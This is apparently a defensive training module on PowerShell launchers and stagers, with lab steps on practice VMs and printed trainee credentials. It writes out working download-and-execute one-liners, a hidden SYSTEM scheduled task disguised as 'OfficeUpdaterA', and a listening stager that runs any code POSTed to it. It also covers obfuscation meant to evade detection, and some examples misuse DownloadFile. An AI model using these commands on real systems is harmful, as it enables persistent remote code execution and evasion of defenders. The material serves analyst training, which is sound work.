PowerShell Launcher Steps
Attackers use PowerShell stagers to hide the details of the final payload and to execute a larger payload in an environment that has command size limitations. For example, if an attacker schedules a task on a remote system, it is difficult to pass an entire malicious payload in the limited amount of characters allowed. It is possible to craft a command that reaches out over the network and executes a larger script. By having the command reach out, it also helps hide what is being executed by the malicious actor. The logging configuration may only catch the code that reaches out to execute more code.

﻿

Launcher/stager scripts are primarily designed to obtain data from the network and execute that data. If execution on this system is achieved by starting PowerShell, there are a few useful options that attackers pass to PowerShell.exe to help ensure their script runs.

﻿

Table 12.3-1 describes the common options that attackers use to execute PowerShell.

 

﻿

Table 12.3-1

﻿

Getting Data from the Network
﻿

Most of the time the attacker wants the PowerShell launcher to call back to a server they are controlling. There are situations where making PowerShell listen on a port is useful, however, local firewalls typically prevent this type of connection so a listening launcher is not as useful. This section covers both ways to get data from a network into PowerShell.

﻿

Outbound Connections
﻿

Invoke-WebRequest or Invoke-RestMethod are the most common ways for PowerShell to pull data over the network. Invoke-RestMethod is better at dealing with JavaScript Object Notation (JSON) and eXtensible Markup Language (XML) data types, while Invoke-WebRequest is better at returning strings.

$response=Invoke-WebRequest -uri "http://1.2.3.4/index.html"
$data=$response.Content
﻿

Another way to obtain data from the network is to call the .NET object directly with the following command:

$data=(New-Object System.Net.WebClient).DownloadFile("http://1.2.3.4/index.html")
﻿

Inbound Connections
﻿

PowerShell is built on the .NET framework, so anything C# can do, PowerShell can do. This means there are many ways to have a system listen for inbound connections in PowerShell. The most common way to listen is to make a webserver.

# Http Server
$http = New-Object System.Net.HttpListener

# Hostname and port to listen on
$http.Prefixes.Add("http://127.0.0.1:8080/")

# Start the Http Server 
$http.Start()

#This will block until there is a connection
$context = $http.GetContext()

$data = [System.IO.StreamReader]::new($context.Request.InputStream).ReadToEnd()
[string]$html = "<h1>A PowerShell Webserver</h1>" 
$buffer = [System.Text.Encoding]::UTF8.GetBytes($html) 
$context.Response.ContentLength64 = $buffer.Length
$context.Response.OutputStream.Write($buffer, 0, $buffer.Length)

#Shutdown gracefully
$context.Response.OutputStream.Close()
$http.Stop()
﻿

Executing Data 
﻿

The second step for a launcher to perform is to execute the code. Launchers use the command Invoke-Expression to execute text. This allows PowerShell to get a block of text, and execute it as commands.

$Command = "get-process"

Invoke-Expression $Command
#or
$Command | Invoke-Expression
﻿

Examples
﻿

When the -Command option is used with PowerShell.exe there is a limitation. The command cannot use variables the same way they are used in a terminal prompt. Commands can be modified to not use variables as an intermediary.

PowerShell.exe -ExecutionPolicy bypass -Command "Invoke-Expression  (Invoke-WebRequest -uri http://199.63.64.31/index.html).content"
﻿

The above example uses PowerShell to retrieve code from a remote location via Hypertext Transmission Protocol (HTTP) and execute the code content. Instead of executing it from the command line, the Scheduled Task (Schtask) command is used to create a scheduled job that automatically executes the PowerShell command at a given interval. The following example creates a scheduled job that downloads code and executes it with PowerShell.

schtasks /create /tn OfficeUpdaterA /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://1.2.3.4/'''))'" /sc onlogon /ru System


 Obfuscation Techniques
Post-exploitation PowerShell scripts use a variety of obfuscation techniques to hide their functionality from users and bypass the Windows Anti-Malware Scan Interface (AMSI) or other antivirus technologies. Defenders need to recognize common obfuscation techniques like encoding in order to apply proper decoding techniques. The ability to adequately identify and utilize obfuscation techniques can help Cyber Defense Analysts (CDA) to replicate or understand attacker activities.

﻿

Base64
﻿

Base64 encoding is commonly used to represent binary data in text form and is a common obfuscation technique that defense analysts must be familiar with. The numbering system is base 10, meaning that each digit represents 10 different things with 10 characters (0..9) to use. In base64, a number is encoded with uppercase and lowercase letters, the 0–9 digits as well as the + and / signs. The = sign is used to pad the number since a base64-encoded string needs to be a multiple of 3. Meaning that if there was a four-character-long base64 string, it requires two = signs afterward to make it an even multiple of 3.

﻿

With PowerShell scripts, there are two options for executing a base64-encoded command. The script receives a base64-encoded string to execute and decodes the string before sending it to Invoke-Expression, or the PowerShell process is kicked off and told to execute a base64-encoded command. PowerShell has this feature because sometimes it is difficult to escape special characters, so PowerShell accepts and executes a base64 command directly.

﻿

Manipulating Base64 Strings
﻿

The following PowerShell code demonstrates the process for taking a string and converting it to the base64 equivalent, followed by the function to decode the base64 back into a plaintext string.

#Convert to a base64 string
$Text = 'get-process'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)

#$Encoded Text is: ZwBlAHQALQBwAHIAbwBjAGUAcwBzAA==

#Decode
$DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))
﻿

Executing a Base64 String Directly
﻿

Instead of converting base64 code to a string for execution, the base64 value can be passed directly to PowerShell for execution. The following example demonstrates that method.

powershell.exe -encodedCommand "ZwBlAHQALQBwAHIAbwBjAGUAcwBzAA=="
﻿

Case Sensitivity
﻿

Windows is famously case-insensitive. It is possible to change directories to c:\windows or c:\wINdoWs and get the same result. This type of obfuscation is commonly seen in attacks, though it is not as effective as other methods.

﻿

An attacker can change their PowerShell script to take advantage of this case insensitivity. These two commands execute the exact same way:

Invoke-WebRequest -uri 'http://1.2.3.4/'
or

inVoKE-weBReQuESt -uRi 'http://1.2.3.4/'
﻿

Random Spaces
﻿

PowerShell does not recognize spaces between the commands, but they may matter to the defenders. Attackers include multiple spaces that are ignored by PowerShell but are aimed at adding obfuscation to the command execution so cyber defense tools are less likely to detect their execution.﻿

inVoKE-weBReQuESt     -uRi  'http://1.2.3.4/'
﻿

String Concatenation
﻿

PowerShell adds strings together, giving an attacker another option to obfuscate the command and avoid detection. If a defender suspects an HTTP Uniform Resource Locator (URL) is used by the attacker, they might conduct log searches using the value http://, but that search does not match the concatenation of characters in the following command:

Invoke-WebRequest -uri 'htt' + 'p' + ':/' + '/1.2.3.4/'
﻿

Internet Protocol Addresses as a Base10 Number
﻿

Internet Protocol version 4 (IPv4) addresses are commonly shown as a set of four octet numbers between 0.0.0.0 and 255.255.255.255. In reality, this is just a human-readable way of representing an integer number between 0 and 4.2 billion. Instead of using the common IPv4 address format, attackers replace the address with the integer equivalent value, making it less noticeable to a defender looking for IPv4 addresses. Attackers use either the decimal representation of the integer, or the hexadecimal format. Each octet of the address is an 8-bit number, and the four together form the 32-bit address. PowerShell can handle multiple formats, giving an attacker the option to connect using a normal IPv4 address, a base10 integer Internet Protocol (IP) address, or a base16 (hex) IP address.  The following example shows PowerShell's ability to convert the address formats, first from standard address to a base10 value, then to base16 value, then back to the standard address.

([ipaddress]"1.2.3.4").Address
67305985

(67305985).tostring('x8')
04030201

([ipaddress]0x04030201).ipaddresstostring
1.2.3.4
﻿

Converting an IP address to a number and back works without issue. However, PowerShell uses host ordering (little-endian) to store the integer value, which is verified above by converting the decimal number to hex. Using that integer as a replacement for the IP address does not work unless it is converted to network ordering (big-endian). This is manually done by reversing the order of the four bytes that make up the hex value and displaying the corresponding base10 value from that. In the example below, converting 1.2.3.4 makes the decimal version corresponding to 4.3.2.1. Simply entering the IP backward and generating the integer for that reversed IP address fixes the problem and provides the correct integer value that can be used to replace the address.

([ipaddress]"1.2.3.4").Address
67305985

ping 67305985
Pinging 4.3.2.1 with 32 bytes of data:

([ipaddress]"4.3.2.1").Address
16909060

ping 16909060
Pinging 1.2.3.4 with 32 bytes of data:
﻿
PowerShell Aliases
PowerShell has the ability to create aliases for other commands. Some standard commands are actually aliases. For example, the command cd is an alias for the real command being executed, Set-Location. There is even an alias for setting aliases, sal. The alias for Invoke-WebRequest is iwr. For a full list of current aliases, use the command get-aliases.

﻿

Existing aliases are used to shorten up a malicious PowerShell command or to make the commands being executed appear benign.

sal block-website iwr
block-website -uri http://1.2.3.4
﻿
Shortening the Request
A launcher script is a minimal amount of code that runs from a smaller space and retrieves a larger amount of code from a remote location. However, at times, even the launcher script might have a reduced amount of space to reside in, such as 255 characters for a Scheduled Task. There are several techniques used to make PowerShell commands shorter, enabling the code to fit into a constrained space. Seeing these techniques used in a script may indicate that the script is malicious.

﻿

Shortening the Callback Request
﻿

The example below is a simple launcher script that downloads code from a remote site via HTTP, stores that code in a variable $data, and executes the code.

$data = (New-Object System.Net.WebClient).DownloadFile("http://1.2.3.4/index.html")
Invoke-Expression $data
﻿

Currently, this is 108 characters. The pipe command can be used so that the $data variable is not needed.

Invoke-Expression (New-Object System.Net.WebClient).DownloadFile("http://1.2.3.4/index.html")
﻿

Removing the $data variable shortens the script to 93 characters. The System in System.Net.WebClient is not required and Invoke-Expression has a default alias of iex.

iex (New-Object Net.WebClient).DownloadFile("http://1.2.3.4/index.html")
﻿

Removing those items brings the request down to 72 characters. The http:// is assumed so it is not required; this brings the total down to 65 characters.

iex (New-Object Net.WebClient).DownloadFile("1.2.3.4/index.html")
﻿

Changing the command to the alias for Invoke-WebRequest brings this launcher down even further to only 36 characters.

iex (iwr 1.2.3.4/index.html).Content
﻿

Depending on the resource name, this line could be even shorter. It does not take many characters for an attacker to gain full control of a system with PowerShell. 

Remain aware of aliases when writing detection signatures, as targeting only full cmdlet names without accounting for abbreviated versions like iwr may result in missed alerts.﻿

﻿

Shortening a Webserver
﻿

This is the original webserver. It executes whatever is sent over a POST command and is 520 characters. The max size for a schtasks command is 255 characters.

$http = New-Object System.Net.HttpListener
$http.Prefixes.Add("http://0.0.0.0:8080/")
$http.Start()
$context = $http.GetContext()
$data = [System.IO.StreamReader]::new($context.Request.InputStream).ReadToEnd()
[string]$html = "<h1>A PowerShell Webserver</h1>" 
$buffer = [System.Text.Encoding]::UTF8.GetBytes($html) 
$context.Response.ContentLength64 = $buffer.Length
$context.Response.OutputStream.Write($buffer, 0, $buffer.Length)
$context.Response.OutputStream.Close() 
$http.Stop()
Invoke-Expression $data
﻿

Using shortening techniques, the size of the webserver code below is reduced down to 367 characters. The techniques included making the variable names single characters, removing all the System prefixes, removing extra spaces between the = signs, removing html, and using a condensed syntax to create the HttpListener object.

$a=[Net.HttpListener]::new() 
$a.Prefixes.Add("http://0.0.0.0:8080/")
$a.Start()
$c=$a.GetContext()
$d=[IO.StreamReader]::new($c.Request.InputStream).ReadToEnd()
[string]$h="" 
$b=[Text.Encoding]::UTF8.GetBytes($h) 
$c.Response.ContentLength64=$b.Length
$c.Response.OutputStream.Write($b, 0, $b.Length)
$c.Response.OutputStream.Close() 
$http.Stop()
iex $d
﻿

Additional space reduction techniques can be implemented. In the case of this webserver, which is only being used to receive additional code for execution, sending data back to the client is not required, so those parts can be removed. With those omissions implemented in the code below, this brings the total size down to 214 characters.

$a=[Net.HttpListener]::new() 
$a.Prefixes.Add("http://0.0.0.0:8080/")
$a.Start()
$c=$a.GetContext()
iex ([IO.StreamReader]::new($c.Request.InputStream)).ReadToEnd()
$c.Response.OutputStream.Close() 
$a.Stop()
﻿

Taking advantage of |% being an alias for passing an object to a ForEach loop, and using $_ reference to that object, all the variables can be removed. This allows the entire webserver to come down to 157 characters. However, the webserver does not close gracefully, so repeated runs in the same powershell.exe process do not work. The client sending the data to the server hangs.

[Net.HttpListener]::new()|%{
  $_.Prefixes.Add("http://0.0.0.0:8080/");
  $_.Start();
  iex ([IO.StreamReader]::new($_.GetContext().Request.InputStream)).ReadToEnd()
}
﻿

To ensure the listening launcher shuts down properly, a Response.OutStream command is included and the code is slightly modified, bringing the total size to 206 characters. That is still small enough to fit in the Schedule Task space limitations while resulting in a webserver that closes gracefully and does not cause the client connection to hang.

[Net.HttpListener]::new()|%{
  $_.Prefixes.Add("http://0.0.0.0:8080/");
  $_.Start();
  $c=$_.GetContext();
  iex ([IO.StreamReader]::new($c.Request.InputStream)).ReadToEnd();
  $c.Response.OutputStream.Close();
  $_.stop()
}
﻿

Shortening the PowerShell.exe Call
﻿

If a launcher is being called outside PowerShell.exe, then the launcher command needs to be passed to the executable with several options. PowerShell options do not require the entire option spelled out, only enough of the characters to uniquely identify the option.

﻿

Table 12.3-2 lists all the options that PowerShell.exe accepts with minimal unique characters. Since four options start with No, to specify the NoProfile option, -nop needs to be specified at a minimum. Likewise, since only one option starts with the letter V to specify Version, then only -v needs to be given. 

﻿

﻿

Table 12.3-2

﻿

This works for all options provided to PowerShell commands. Invoke-WebRequest has the following options starting with the letter M, -Method and -MaximumRedirection, and only one option starting with the letter B. That means these two commands do the same thing.

iwr http://127.0.0.1:8080/ -Method POST -Body 'get-process'
and

iwr http://127.0.0.1:8080/ -Me POST -B 'get-process'


 Creating and Utilizing PowerShell Scripts
Create a PowerShell script launcher that connects to a backend server. The server serves up a PowerShell script over port 80 when a request is made for the index.html resource.

﻿

Workflow
﻿

1. Log in to the Virtual Machine (VM) kali-hunt using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Launch the Python-based backend server by opening a terminal and running the following command:

$ sudo python3 /home/trainee/Desktop/webserver.py
﻿

This webserver listens on all interfaces for traffic going to port 80. Any GET request for index.html results in sending payload_1.ps1 to be executed on the client. All other requests receive a default page saying that this is an example webserver.

﻿

3. Log in to the VM win-hunt using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

4. Run the following PowerShell command to request / from the webserver (199.63.64.51) using Invoke-WebRequest:

iwr 199.63.64.51/
﻿

The default action for this webserver is to only serve the PowerShell payload when there is a request for the index.html file. It is common for malicious webservers to act differently for a particular request as a means to be more stealthy.

﻿

5. Run the following PowerShell command to request /index.html from the webserver (199.63.64.51) using Invoke-WebRequest:

iwr 199.63.64.51/index.html
﻿

6. Run the following PowerShell command to execute the content from the web request:

iex (iwr 199.63.64.51/index.html).content

Creating a Listening Stager
Create a PowerShell stager that listens on a port for connections. On a separate system, the curl command is utilized to send a PowerShell payload to the listening port.

﻿

Workflow
﻿

1. Using the VMs from the previous workflow, open a new administrator PowerShell window on the win-hunt VM.

﻿

The win-hunt system currently has the firewall disabled, however, due to security settings, PowerShell is only allowed to create a listening socket on a high port (over 40,000) and on an individual interface (not 0.0.0.0).

﻿

2. Create a listening webserver in PowerShell that accepts data sent over a POST command and executes the payload:

[Net.HttpListener]::new()|%{
    $_.Prefixes.Add("http://199.63.64.31:42000/");
    $_.Start();
    $c=$_.GetContext();
    iex ([IO.StreamReader]::new($c.Request.InputStream)).ReadToEnd();
    $c.Response.OutputStream.Close();
    $_.stop()
}
NOTE: After submitting the stager, the absence of apparent change or feedback indicates successful execution.﻿

﻿

3. Navigate to the kali-hunt VM and open a terminal.

﻿

4. Run the following curl command to send the contents of the payload_2.ps1 file to the win-hunt VM:

curl -X POST -H Content-type: text/plain --data-binary @/home/trainee/Desktop/payload_2.ps1 http://199.63.64.31:42000/
﻿

The curl command sends the payload_2.ps1 file into the listening port on the win-hunt VM rather than the win-hunt VM calling back.

